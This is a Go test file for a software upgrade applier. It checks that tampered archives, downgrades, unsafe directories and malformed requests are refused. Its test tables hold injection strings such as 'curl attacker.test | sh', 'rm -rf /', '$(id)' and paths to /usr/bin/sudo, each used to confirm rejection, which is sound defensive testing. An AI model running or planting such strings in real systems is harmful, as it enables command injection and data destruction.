package upgrade

import (
	"context"
	"errors"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

// applierFixture is an Applier over a temporary installation: a handoff
// directory, an install path and a local release server. Nothing in it needs
// root, a real service or the network.
//
//nolint:govet // Keep fixture fields grouped by what they stand in for.
type applierFixture struct {
	applier    *Applier
	release    *releaseServer
	stateDir   string
	installDir string

	// InstallPath is the binary the applier replaces.
	installPath string

	// restarts counts restart calls, so a test can tell an installed-and-
	// restarted outcome from an installed-but-not-restarted one.
	restarts int

	// restartErr is returned by the injected restart.
	restartErr error
}

// newApplierFixture builds an applier that is installed at `installed` and has
// `target` published, with the release archive already staged.
func newApplierFixture(t *testing.T, installed string, target string) *applierFixture {
	t.Helper()

	root := t.TempDir()
	state := filepath.Join(root, "state")
	installDir := filepath.Join(root, "bin")
	for _, dir := range []string{state, installDir} {
		if err := os.Mkdir(dir, 0o755); err != nil {
			t.Fatalf("Mkdir(%q) error = %v", dir, err)
		}
	}

	installPath := filepath.Join(installDir, BinaryName)
	if err := os.WriteFile(installPath, []byte("#!/bin/sh\necho \"oberwatch "+installed+"\"\n"), 0o755); err != nil {
		t.Fatalf("WriteFile() error = %v", err)
	}

	targetVersion := mustParseVersion(t, target)
	archiveName, err := ArchiveName(targetVersion, testPlatform)
	if err != nil {
		t.Fatalf("ArchiveName() error = %v", err)
	}
	archive := writeTarGz(t, filepath.Join(state, archiveName), releaseEntries(target))

	release := newReleaseServer(t, map[string]map[string][]byte{
		targetVersion.Tag(): {
			ChecksumsName: checksumsDocument(map[string][]byte{archiveName: archive}),
		},
	})

	fixture := &applierFixture{
		release:     release,
		stateDir:    state,
		installDir:  installDir,
		installPath: installPath,
	}
	fixture.applier = &Applier{
		Fetcher:     &Fetcher{BaseURL: release.BaseURL, HTTPClient: newArtifactClient()},
		StateDir:    state,
		InstallPath: installPath,
		Installed:   mustParseVersion(t, installed),
		Platform:    testPlatform,
		Restart: func(context.Context) error {
			fixture.restarts++
			return fixture.restartErr
		},
	}
	return fixture
}

func (f *applierFixture) request(t *testing.T, tag string, from string) {
	t.Helper()

	if err := WriteRequest(f.stateDir, Request{Tag: tag, From: from, RequestedAt: "2026-08-28T12:00:00Z"}); err != nil {
		t.Fatalf("WriteRequest() error = %v", err)
	}
}

func TestApplier_Apply_InstallsVerifiesBacksUpAndRestarts(t *testing.T) {
	t.Parallel()

	fixture := newApplierFixture(t, "v0.1.3", "v0.1.4")
	fixture.request(t, "v0.1.4", "v0.1.3")

	result, err := fixture.applier.Apply(context.Background())
	if err != nil {
		t.Fatalf("Apply() error = %v", err)
	}
	if result.Status != ResultSucceeded {
		t.Fatalf("Apply() status = %q, want %q: %s", result.Status, ResultSucceeded, result.Message)
	}
	if result.Tag != "v0.1.4" || result.From != "v0.1.3" {
		t.Fatalf("Apply() = %+v, want it to record v0.1.3 -> v0.1.4", result)
	}
	if fixture.restarts != 1 {
		t.Fatalf("restart called %d times, want exactly once", fixture.restarts)
	}

	installed, err := os.ReadFile(fixture.installPath)
	if err != nil {
		t.Fatalf("ReadFile() error = %v", err)
	}
	if !strings.Contains(string(installed), "oberwatch v0.1.4") {
		t.Fatalf("install path holds %q, want the new binary", installed)
	}
	info, err := os.Stat(fixture.installPath)
	if err != nil {
		t.Fatalf("Stat() error = %v", err)
	}
	if info.Mode().Perm() != 0o755 {
		t.Fatalf("install path mode = %o, want 755", info.Mode().Perm())
	}

	backup, err := os.ReadFile(filepath.Join(fixture.installDir, BackupName))
	if err != nil {
		t.Fatalf("the replaced binary was not kept for rollback: %v", err)
	}
	if !strings.Contains(string(backup), "oberwatch v0.1.3") {
		t.Fatalf("rollback copy holds %q, want the replaced binary", backup)
	}

	// The message has to state the things an operator needs to know before and
	// after the restart.
	for _, phrase := range []string{"restarted", "Configuration and data were not changed", "roll back"} {
		if !strings.Contains(result.Message, phrase) {
			t.Errorf("Apply() message = %q, want it to mention %q", result.Message, phrase)
		}
	}

	recorded, found, err := ReadResult(fixture.stateDir)
	if err != nil || !found {
		t.Fatalf("ReadResult() = found %v, error %v", found, err)
	}
	if recorded.Status != ResultSucceeded {
		t.Fatalf("recorded result = %+v, want a success", recorded)
	}

	// The request is consumed and the staged archive is cleaned up, so the
	// applier does not run again on the next activation.
	if _, _, err := ReadRequest(fixture.stateDir); !errors.Is(err, ErrNoRequest) {
		t.Fatalf("ReadRequest() after Apply() error = %v, want ErrNoRequest", err)
	}
	assertNoStagedArchives(t, fixture.stateDir)
}

func TestApplier_Apply_DoesNothingWithoutARequest(t *testing.T) {
	t.Parallel()

	fixture := newApplierFixture(t, "v0.1.3", "v0.1.4")

	if _, err := fixture.applier.Apply(context.Background()); !errors.Is(err, ErrNoRequest) {
		t.Fatalf("Apply() error = %v, want ErrNoRequest", err)
	}
	if fixture.restarts != 0 {
		t.Fatal("Apply() restarted the service with no request waiting")
	}
	assertBinaryVersion(t, fixture.installPath, "v0.1.3")
}

// The privileged applier does not trust the unprivileged service that staged the
// archive. These are the cases where that matters.
func TestApplier_Apply_RefusesUntrustworthyRequests(t *testing.T) {
	t.Parallel()

	tests := []struct {
		name       string
		installed  string
		target     string
		tag        string
		mutate     func(t *testing.T, fixture *applierFixture)
		wantReason string
	}{
		{
			name:       "a downgrade",
			installed:  "v0.1.4",
			target:     "v0.1.3",
			tag:        "v0.1.3",
			wantReason: "not newer",
		},
		{
			name:       "the same version",
			installed:  "v0.1.4",
			target:     "v0.1.4",
			tag:        "v0.1.4",
			wantReason: "not newer",
		},
		{
			name:      "an archive that does not match the published checksum",
			installed: "v0.1.3",
			target:    "v0.1.4",
			tag:       "v0.1.4",
			mutate: func(t *testing.T, fixture *applierFixture) {
				// This is the escalation attempt: the staged archive is replaced
				// with an attacker's build after it was verified by the service.
				replaceStagedArchive(t, fixture, []tarEntry{{
					Name:     BinaryName,
					Body:     "#!/bin/sh\necho \"oberwatch v0.1.4\"\ntouch /tmp/pwned\n",
					Mode:     0o755,
					Typeflag: 0,
				}})
			},
			wantReason: "checksum mismatch",
		},
		{
			name:      "a genuine archive with extra bytes appended",
			installed: "v0.1.3",
			target:    "v0.1.4",
			tag:       "v0.1.4",
			mutate: func(t *testing.T, fixture *applierFixture) {
				// The archive still unpacks to the right binary, so only a digest
				// taken over the whole file catches it.
				path := stagedArchiveOf(t, fixture)
				file, err := os.OpenFile(path, os.O_WRONLY|os.O_APPEND, 0o600)
				if err != nil {
					t.Fatalf("OpenFile() error = %v", err)
				}
				if _, err := file.Write([]byte(strings.Repeat("attacker", 4096))); err != nil {
					t.Fatalf("Write() error = %v", err)
				}
				if err := file.Close(); err != nil {
					t.Fatalf("Close() error = %v", err)
				}
			},
			wantReason: "checksum mismatch",
		},
		{
			name:      "no staged archive at all",
			installed: "v0.1.3",
			target:    "v0.1.4",
			tag:       "v0.1.4",
			mutate: func(t *testing.T, fixture *applierFixture) {
				assertRemoveStagedArchive(t, fixture)
			},
			wantReason: "staged archive",
		},
		{
			name:      "a symlink in place of the staged archive",
			installed: "v0.1.3",
			target:    "v0.1.4",
			tag:       "v0.1.4",
			mutate: func(t *testing.T, fixture *applierFixture) {
				path := assertRemoveStagedArchive(t, fixture)
				elsewhere := filepath.Join(t.TempDir(), "planted.tar.gz")
				writeTarGz(t, elsewhere, releaseEntries("v0.1.4"))
				if err := os.Symlink(elsewhere, path); err != nil {
					t.Fatalf("Symlink() error = %v", err)
				}
			},
			wantReason: "staged archive",
		},
		{
			name:      "the install directory is world-writable",
			installed: "v0.1.3",
			target:    "v0.1.4",
			tag:       "v0.1.4",
			mutate: func(t *testing.T, fixture *applierFixture) {
				if err := os.Chmod(fixture.installDir, 0o777); err != nil {
					t.Fatalf("Chmod() error = %v", err)
				}
			},
			wantReason: "install directory",
		},
		{
			name:      "the release publishes no checksum for the archive",
			installed: "v0.1.3",
			target:    "v0.1.4",
			tag:       "v0.1.4",
			mutate: func(t *testing.T, fixture *applierFixture) {
				fixture.applier.Fetcher = &Fetcher{
					BaseURL:    fixture.release.BaseURL + "missing/",
					HTTPClient: newArtifactClient(),
				}
			},
			wantReason: "release checksums",
		},
		{
			name:      "the staged binary does not report the requested version",
			installed: "v0.1.3",
			target:    "v0.1.4",
			tag:       "v0.1.4",
			mutate: func(t *testing.T, fixture *applierFixture) {
				fixture.applier.VerifyBinary = func(context.Context, string, Version) error {
					return errors.New("staged binary does not report v0.1.4")
				}
			},
			wantReason: "does not report",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()

			fixture := newApplierFixture(t, tt.installed, tt.target)
			fixture.request(t, tt.tag, tt.installed)
			if tt.mutate != nil {
				tt.mutate(t, fixture)
			}

			result, err := fixture.applier.Apply(context.Background())
			if !errors.Is(err, ErrRefused) {
				t.Fatalf("Apply() error = %v, want ErrRefused", err)
			}
			if result.Status != ResultFailed {
				t.Fatalf("Apply() status = %q, want %q", result.Status, ResultFailed)
			}
			if !strings.Contains(result.Message, tt.wantReason) {
				t.Fatalf("Apply() message = %q, want it to mention %q", result.Message, tt.wantReason)
			}
			if !strings.Contains(result.Message, "Nothing was installed") {
				t.Fatalf("Apply() message = %q, want it to state that nothing was installed", result.Message)
			}

			// The installed binary is untouched and the service was not
			// restarted.
			assertBinaryVersion(t, fixture.installPath, tt.installed)
			if fixture.restarts != 0 {
				t.Fatalf("restart called %d times after a refusal, want none", fixture.restarts)
			}
			if _, statErr := os.Stat(filepath.Join(fixture.installDir, BackupName)); statErr == nil {
				t.Fatal("Apply() wrote a rollback copy even though nothing was installed")
			}

			// The refusal is recorded and the request is consumed, so the applier
			// is not re-triggered forever by the same request.
			recorded, found, readErr := ReadResult(fixture.stateDir)
			if readErr != nil || !found {
				t.Fatalf("ReadResult() = found %v, error %v", found, readErr)
			}
			if recorded.Status != ResultFailed {
				t.Fatalf("recorded result = %+v, want a failure", recorded)
			}
			if _, _, reqErr := ReadRequest(fixture.stateDir); !errors.Is(reqErr, ErrNoRequest) {
				t.Fatalf("ReadRequest() after a refusal error = %v, want ErrNoRequest", reqErr)
			}

			// No temporary binary is left next to the install path for anything
			// else to pick up.
			entries, dirErr := os.ReadDir(fixture.installDir)
			if dirErr != nil {
				t.Fatalf("ReadDir() error = %v", dirErr)
			}
			for _, entry := range entries {
				if strings.HasPrefix(entry.Name(), applyTempPrefix) {
					t.Fatalf("Apply() left %q next to the install path", entry.Name())
				}
			}
		})
	}
}

func TestApplier_Apply_RefusesARequestFileItCannotFullyValidate(t *testing.T) {
	t.Parallel()

	tests := []struct {
		name    string
		content string
	}{
		{name: "a tag naming a url", content: `{"tag":"https://attacker.test/payload.tar.gz"}`},
		{name: "a tag naming a path", content: `{"tag":"../../../usr/bin/sudo"}`},
		{name: "a tag with a shell fragment", content: `{"tag":"v0.1.4; curl attacker.test | sh"}`},
		{name: "an extra install path field", content: `{"tag":"v0.1.4","install_path":"/usr/bin/sudo"}`},
		{name: "an extra archive field", content: `{"tag":"v0.1.4","archive":"/tmp/attacker.tar.gz"}`},
		{name: "an extra url field", content: `{"tag":"v0.1.4","url":"https://attacker.test/x.tar.gz"}`},
		{name: "an extra command field", content: `{"tag":"v0.1.4","command":"/bin/sh -c id"}`},
		{name: "an extra checksum field", content: `{"tag":"v0.1.4","sha256":"0000"}`},
		{name: "a prerelease tag", content: `{"tag":"v0.1.4-rc.1"}`},
		{name: "not json at all", content: `v0.1.4`},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()

			fixture := newApplierFixture(t, "v0.1.3", "v0.1.4")
			if err := os.WriteFile(RequestPath(fixture.stateDir), []byte(tt.content), 0o600); err != nil {
				t.Fatalf("WriteFile() error = %v", err)
			}

			result, err := fixture.applier.Apply(context.Background())
			if !errors.Is(err, ErrRefused) {
				t.Fatalf("Apply() error = %v, want ErrRefused for %q", err, tt.content)
			}
			if result.Status != ResultFailed {
				t.Fatalf("Apply() status = %q, want %q", result.Status, ResultFailed)
			}
			assertBinaryVersion(t, fixture.installPath, "v0.1.3")
			if fixture.restarts != 0 {
				t.Fatal("Apply() restarted the service after refusing a request it could not validate")
			}
			if _, _, reqErr := ReadRequest(fixture.stateDir); !errors.Is(reqErr, ErrNoRequest) {
				t.Fatalf("ReadRequest() error = %v, want the unusable request to be consumed", reqErr)
			}
		})
	}
}

func TestApplier_Apply_ReportsRestartRequiredWhenTheRestartFails(t *testing.T) {
	t.Parallel()

	fixture := newApplierFixture(t, "v0.1.3", "v0.1.4")
	fixture.restartErr = errors.New("systemctl was not found")
	fixture.request(t, "v0.1.4", "v0.1.3")

	result, err := fixture.applier.Apply(context.Background())
	if err != nil {
		t.Fatalf("Apply() error = %v", err)
	}
	if result.Status != ResultRestartRequired {
		t.Fatalf("Apply() status = %q, want %q", result.Status, ResultRestartRequired)
	}
	for _, phrase := range []string{"previous version is still running", "systemctl restart " + ServiceName} {
		if !strings.Contains(result.Message, phrase) {
			t.Errorf("Apply() message = %q, want it to mention %q", result.Message, phrase)
		}
	}

	// The swap did happen; only the restart did not.
	assertBinaryVersion(t, fixture.installPath, "v0.1.4")
}

func TestApplier_Apply_RefusesAnUnsafeHandoffDirectory(t *testing.T) {
	t.Parallel()

	fixture := newApplierFixture(t, "v0.1.3", "v0.1.4")
	fixture.request(t, "v0.1.4", "v0.1.3")
	if err := os.Chmod(fixture.stateDir, 0o777); err != nil {
		t.Fatalf("Chmod() error = %v", err)
	}

	if _, err := fixture.applier.Apply(context.Background()); err == nil {
		t.Fatal("Apply() acted on a request in a world-writable handoff directory")
	}
	assertBinaryVersion(t, fixture.installPath, "v0.1.3")
}

func TestApplier_Apply_LeavesConfigurationAndDataUntouched(t *testing.T) {
	t.Parallel()

	fixture := newApplierFixture(t, "v0.1.3", "v0.1.4")
	fixture.request(t, "v0.1.4", "v0.1.3")

	// A stand-in for the service's own state: config file, database and its
	// sidecars, plus a subdirectory. The applier replaces a binary and must not
	// read, write or remove any of this.
	stateTree := t.TempDir()
	if err := os.Mkdir(filepath.Join(stateTree, "data"), 0o700); err != nil {
		t.Fatalf("Mkdir() error = %v", err)
	}
	files := map[string]string{
		"oberwatch.toml":         "[server]\nport = 8080\n",
		"data/oberwatch.db":      "sqlite database bytes",
		"data/oberwatch.db-wal":  "write ahead log bytes",
		"data/oberwatch.db-shm":  "shared memory bytes",
		"data/agents-export.csv": "agent,cost\n",
	}
	for name, content := range files {
		if err := os.WriteFile(filepath.Join(stateTree, name), []byte(content), 0o600); err != nil {
			t.Fatalf("WriteFile(%q) error = %v", name, err)
		}
	}
	before := snapshotTree(t, stateTree)

	if _, err := fixture.applier.Apply(context.Background()); err != nil {
		t.Fatalf("Apply() error = %v", err)
	}

	assertTreeUnchanged(t, stateTree, before)
}

func TestApplier_ResolveInstallPath(t *testing.T) {
	t.Parallel()

	//nolint:govet // Keep table fields grouped by request, then expectation.
	tests := []struct {
		name    string
		build   func(t *testing.T) (installPath string, want string)
		wantErr bool
	}{
		{
			name: "a regular file in a safe directory",
			build: func(t *testing.T) (string, string) {
				dir := safeDir(t)
				path := filepath.Join(dir, BinaryName)
				if err := os.WriteFile(path, []byte("binary"), 0o755); err != nil {
					t.Fatalf("WriteFile() error = %v", err)
				}
				return path, path
			},
		},
		{
			name: "a symlink is resolved to its target",
			build: func(t *testing.T) (string, string) {
				dir := safeDir(t)
				target := filepath.Join(dir, "oberwatch-real")
				if err := os.WriteFile(target, []byte("binary"), 0o755); err != nil {
					t.Fatalf("WriteFile() error = %v", err)
				}
				link := filepath.Join(dir, BinaryName)
				if err := os.Symlink(target, link); err != nil {
					t.Fatalf("Symlink() error = %v", err)
				}
				return link, target
			},
		},
		{
			name: "a world-writable install directory is refused",
			build: func(t *testing.T) (string, string) {
				dir := filepath.Join(t.TempDir(), "bin")
				if err := os.Mkdir(dir, 0o777); err != nil {
					t.Fatalf("Mkdir() error = %v", err)
				}
				if err := os.Chmod(dir, 0o777); err != nil {
					t.Fatalf("Chmod() error = %v", err)
				}
				path := filepath.Join(dir, BinaryName)
				if err := os.WriteFile(path, []byte("binary"), 0o755); err != nil {
					t.Fatalf("WriteFile() error = %v", err)
				}
				return path, ""
			},
			wantErr: true,
		},
		{
			name: "a group-writable install directory is refused",
			build: func(t *testing.T) (string, string) {
				dir := filepath.Join(t.TempDir(), "bin")
				if err := os.Mkdir(dir, 0o775); err != nil {
					t.Fatalf("Mkdir() error = %v", err)
				}
				if err := os.Chmod(dir, 0o775); err != nil {
					t.Fatalf("Chmod() error = %v", err)
				}
				path := filepath.Join(dir, BinaryName)
				if err := os.WriteFile(path, []byte("binary"), 0o755); err != nil {
					t.Fatalf("WriteFile() error = %v", err)
				}
				return path, ""
			},
			wantErr: true,
		},
		{
			name: "a directory in place of the binary is refused",
			build: func(t *testing.T) (string, string) {
				dir := safeDir(t)
				path := filepath.Join(dir, BinaryName)
				if err := os.Mkdir(path, 0o755); err != nil {
					t.Fatalf("Mkdir() error = %v", err)
				}
				return path, ""
			},
			wantErr: true,
		},
		{
			name: "a missing binary is refused",
			build: func(t *testing.T) (string, string) {
				return filepath.Join(safeDir(t), BinaryName), ""
			},
			wantErr: true,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()

			installPath, want := tt.build(t)
			applier := &Applier{InstallPath: installPath}

			got, err := applier.resolveInstallPath()
			if tt.wantErr != (err != nil) {
				t.Fatalf("resolveInstallPath() error = %v, wantErr %v", err, tt.wantErr)
			}
			if tt.wantErr {
				return
			}
			resolvedWant, evalErr := filepath.EvalSymlinks(want)
			if evalErr != nil {
				t.Fatalf("EvalSymlinks() error = %v", evalErr)
			}
			if got != resolvedWant {
				t.Fatalf("resolveInstallPath() = %q, want %q", got, resolvedWant)
			}
		})
	}
}

func TestVerifyBinaryVersion(t *testing.T) {
	t.Parallel()

	tests := []struct {
		name    string
		script  string
		target  string
		wantErr bool
	}{
		{name: "reports the requested version", script: "#!/bin/sh\necho \"oberwatch v0.1.4\"\n", target: "v0.1.4"},
		{name: "reports another version", script: "#!/bin/sh\necho \"oberwatch v0.1.3\"\n", target: "v0.1.4", wantErr: true},
		{name: "reports a longer version containing the target", script: "#!/bin/sh\necho \"oberwatch v0.1.40\"\n", target: "v0.1.4", wantErr: true},
		{name: "embeds the target in unrelated output", script: "#!/bin/sh\necho \"not-oberwatch v0.1.4\"\n", target: "v0.1.4", wantErr: true},
		{name: "reports nothing", script: "#!/bin/sh\nexit 0\n", target: "v0.1.4", wantErr: true},
		{name: "exits non-zero", script: "#!/bin/sh\necho \"oberwatch v0.1.4\"\nexit 3\n", target: "v0.1.4", wantErr: true},
		{name: "writes to stderr only", script: "#!/bin/sh\necho \"oberwatch v0.1.4\" >&2\n", target: "v0.1.4", wantErr: true},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()

			path := filepath.Join(t.TempDir(), "staged")
			if err := os.WriteFile(path, []byte(tt.script), 0o755); err != nil {
				t.Fatalf("WriteFile() error = %v", err)
			}

			err := verifyBinaryVersion(context.Background(), path, mustParseVersion(t, tt.target))
			if tt.wantErr != (err != nil) {
				t.Fatalf("verifyBinaryVersion() error = %v, wantErr %v", err, tt.wantErr)
			}
		})
	}
}

func TestVerifyBinaryVersion_RefusesARelativePath(t *testing.T) {
	t.Parallel()

	if err := verifyBinaryVersion(context.Background(), "staged", mustParseVersion(t, "v0.1.4")); err == nil {
		t.Fatal("verifyBinaryVersion() accepted a relative path; only an absolute path may be executed")
	}
}

func TestRestartService_RefusesAnythingButAPlainUnitName(t *testing.T) {
	t.Parallel()

	tests := []struct {
		name    string
		service string
	}{
		{name: "empty", service: ""},
		{name: "a shell fragment", service: "oberwatch; rm -rf /"},
		{name: "a command substitution", service: "oberwatch$(id)"},
		{name: "a pipeline", service: "oberwatch | sh"},
		{name: "a path", service: "../../etc/systemd/system/evil.service"},
		{name: "a flag", service: "--user"},
		{name: "an absolute path", service: "/etc/systemd/system/evil.service"},
		{name: "a space separated pair", service: "oberwatch other"},
		{name: "a newline", service: "oberwatch\nrm -rf /"},
		{name: "uppercase", service: "Oberwatch"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()

			err := RestartService(context.Background(), tt.service)
			if err == nil {
				t.Fatalf("RestartService(%q) accepted a name that is not a plain unit name", tt.service)
			}
			if errors.Is(err, errNoSystemctl) {
				t.Fatalf("RestartService(%q) reached systemctl lookup; the name must be refused first", tt.service)
			}
		})
	}
}

func TestServiceNameIsAPlainUnitName(t *testing.T) {
	t.Parallel()

	if !serviceNamePattern.MatchString(ServiceName) {
		t.Fatalf("ServiceName = %q, which the restart guard would refuse", ServiceName)
	}
}

func TestFindSystemctl(t *testing.T) {
	t.Parallel()

	root := safeDir(t)
	executable := filepath.Join(root, "systemctl")
	if err := os.WriteFile(executable, []byte("#!/bin/sh\n"), 0o755); err != nil {
		t.Fatalf("WriteFile() error = %v", err)
	}
	notExecutable := filepath.Join(root, "systemctl-noexec")
	if err := os.WriteFile(notExecutable, []byte("#!/bin/sh\n"), 0o644); err != nil {
		t.Fatalf("WriteFile() error = %v", err)
	}

	//nolint:govet // Keep table fields grouped by script, then expectation.
	tests := []struct {
		name       string
		candidates []string
		want       string
		wantErr    bool
	}{
		{name: "the first executable candidate wins", candidates: []string{filepath.Join(root, "missing"), executable}, want: executable},
		{name: "a non-executable candidate is skipped", candidates: []string{notExecutable, executable}, want: executable},
		{name: "a directory candidate is skipped", candidates: []string{root, executable}, want: executable},
		{name: "a relative candidate is never used", candidates: []string{"systemctl"}, wantErr: true},
		{name: "no candidate at all", candidates: nil, wantErr: true},
		{name: "nothing found", candidates: []string{filepath.Join(root, "missing")}, wantErr: true},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()

			got, err := findSystemctl(tt.candidates)
			if tt.wantErr {
				if !errors.Is(err, errNoSystemctl) {
					t.Fatalf("findSystemctl() error = %v, want errNoSystemctl", err)
				}
				return
			}
			if err != nil {
				t.Fatalf("findSystemctl() error = %v", err)
			}
			if got != tt.want {
				t.Fatalf("findSystemctl() = %q, want %q", got, tt.want)
			}
		})
	}
}

func TestSystemctlPathsAreAbsolute(t *testing.T) {
	t.Parallel()

	if len(systemctlPaths) == 0 {
		t.Fatal("no systemctl locations are configured")
	}
	for _, candidate := range systemctlPaths {
		if !filepath.IsAbs(candidate) {
			t.Errorf("systemctl candidate %q is not absolute; PATH must never decide what runs as root", candidate)
		}
	}
}

func TestNewApplier_UsesTheInstalledLocations(t *testing.T) {
	t.Parallel()

	applier := NewApplier(mustParseVersion(t, "v0.1.3"))
	if applier.StateDir != StateDir {
		t.Errorf("NewApplier().StateDir = %q, want %q", applier.StateDir, StateDir)
	}
	if applier.InstallPath != "" {
		t.Errorf("NewApplier().InstallPath = %q, want it resolved from the running executable", applier.InstallPath)
	}
	if applier.Platform != CurrentPlatform() {
		t.Errorf("NewApplier().Platform = %s, want %s", applier.Platform, CurrentPlatform())
	}
	if applier.Fetcher.BaseURL != DownloadBaseURL {
		t.Errorf("NewApplier() fetcher base = %q, want %q", applier.Fetcher.BaseURL, DownloadBaseURL)
	}
}

func TestCopyFile_ReplacesTheDestinationAtomically(t *testing.T) {
	t.Parallel()

	root := t.TempDir()
	source := filepath.Join(root, "source")
	if err := os.WriteFile(source, []byte("new content"), 0o755); err != nil {
		t.Fatalf("WriteFile() error = %v", err)
	}
	destination := filepath.Join(root, "destination")
	if err := os.WriteFile(destination, []byte("old content"), 0o644); err != nil {
		t.Fatalf("WriteFile() error = %v", err)
	}

	if err := copyFile(source, destination, 0o755); err != nil {
		t.Fatalf("copyFile() error = %v", err)
	}

	content, err := os.ReadFile(destination)
	if err != nil {
		t.Fatalf("ReadFile() error = %v", err)
	}
	if string(content) != "new content" {
		t.Fatalf("destination = %q, want the source content", content)
	}
	info, err := os.Stat(destination)
	if err != nil {
		t.Fatalf("Stat() error = %v", err)
	}
	if info.Mode().Perm() != 0o755 {
		t.Fatalf("destination mode = %o, want 755", info.Mode().Perm())
	}

	entries, err := os.ReadDir(root)
	if err != nil {
		t.Fatalf("ReadDir() error = %v", err)
	}
	if len(entries) != 2 {
		t.Fatalf("directory holds %d entries, want the temporary copy cleaned up", len(entries))
	}

	if err := copyFile(filepath.Join(root, "missing"), destination, 0o755); err == nil {
		t.Fatal("copyFile() accepted a missing source")
	}
}

func replaceStagedArchive(t *testing.T, fixture *applierFixture, entries []tarEntry) {
	t.Helper()

	path := stagedArchiveOf(t, fixture)
	if err := os.Remove(path); err != nil {
		t.Fatalf("Remove() error = %v", err)
	}
	writeTarGz(t, path, entries)
}

func assertRemoveStagedArchive(t *testing.T, fixture *applierFixture) string {
	t.Helper()

	path := stagedArchiveOf(t, fixture)
	if err := os.Remove(path); err != nil {
		t.Fatalf("Remove() error = %v", err)
	}
	return path
}

func stagedArchiveOf(t *testing.T, fixture *applierFixture) string {
	t.Helper()

	entries, err := os.ReadDir(fixture.stateDir)
	if err != nil {
		t.Fatalf("ReadDir() error = %v", err)
	}
	for _, entry := range entries {
		if strings.HasSuffix(entry.Name(), ".tar.gz") {
			return filepath.Join(fixture.stateDir, entry.Name())
		}
	}
	t.Fatalf("no staged archive in %s", fixture.stateDir)
	return ""
}

func assertBinaryVersion(t *testing.T, path string, want string) {
	t.Helper()

	content, err := os.ReadFile(path)
	if err != nil {
		t.Fatalf("ReadFile(%q) error = %v", path, err)
	}
	if !strings.Contains(string(content), "oberwatch "+want) {
		t.Fatalf("%s holds %q, want the %s binary", path, content, want)
	}
}

func assertNoStagedArchives(t *testing.T, dir string) {
	t.Helper()

	entries, err := os.ReadDir(dir)
	if err != nil {
		t.Fatalf("ReadDir() error = %v", err)
	}
	for _, entry := range entries {
		if strings.HasSuffix(entry.Name(), ".tar.gz") {
			t.Fatalf("%s was left staged in %s", entry.Name(), dir)
		}
	}
}
